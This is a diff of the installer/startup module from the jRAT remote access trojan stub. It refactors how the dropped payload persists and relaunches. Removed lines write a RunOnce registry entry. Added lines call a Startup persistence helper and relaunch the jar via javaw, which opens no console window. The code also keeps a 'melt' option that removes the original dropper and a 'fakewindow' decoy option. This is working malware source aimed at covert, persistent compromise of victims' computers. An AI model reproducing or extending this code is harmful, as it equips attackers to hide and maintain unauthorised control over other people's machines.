@@ -19,8 +19,7 @@ import javax.swing.UIManager;
 import se.jrat.common.DropLocations;
 import se.jrat.common.crypto.CryptoUtils;
 import se.jrat.stub.Configuration;
-import se.jrat.stub.Main;
-import se.jrat.stub.WinRegistry;
+import se.jrat.stub.Startup;
 import se.jrat.stub.utils.Utils;
 
 import com.redpois0n.oslib.OperatingSystem;
@@ -168,28 +167,26 @@ public class InstallerStartupModule extends StartupModule {
 				
 				boolean runNextBoot = Boolean.parseBoolean(Configuration.getConfig().get("runnextboot"));
 				boolean melt = Boolean.parseBoolean(Configuration.getConfig().get("melt"));
+				
+				Startup.addToStartup(file, Configuration.getConfig().get("name"), runNextBoot);
+				
+                if (!runNextBoot && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+					String javaPath = System.getProperty("java.home") + "\\bin\\javaw";
 
-				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
-					
-					String javaPath = System.getProperty("java.home") + "\\bin\\java";
-					
-					if (runNextBoot) {
-						WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Java", "\"" + javaPath + "\" -jar \"" + file.getAbsolutePath() + "\"" + (melt ? " -melt" : ""));
-					} else {
-						if (melt) {
-							Runtime.getRuntime().exec(new String[] { javaPath, "-jar", file.getAbsolutePath(), "-melt", Utils.getJarFile().getAbsolutePath() });
-						} else {
-							Runtime.getRuntime().exec(new String[] { javaPath, "-jar", file.getAbsolutePath() });
-						}
-					}
-				} else {
 					if (melt) {
-						String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "-melt", mepath });
+						Runtime.getRuntime().exec(new String[] { javaPath, "-jar", file.getAbsolutePath(), "-melt", Utils.getJarFile().getAbsolutePath() });
 					} else {
-						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath() });
+						Runtime.getRuntime().exec(new String[] { javaPath, "-jar", file.getAbsolutePath() });
 					}
-				}
+				} else if (!runNextBoot) {
+                    if (melt) {
+                        Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "-melt", Utils.getJarFile().getAbsolutePath() });
+                    } else {
+                        Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath() });
+                    }
+                }
+
+				
 				if (Boolean.parseBoolean(Configuration.getConfig().get("fakewindow"))) {
 					try {
 						UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
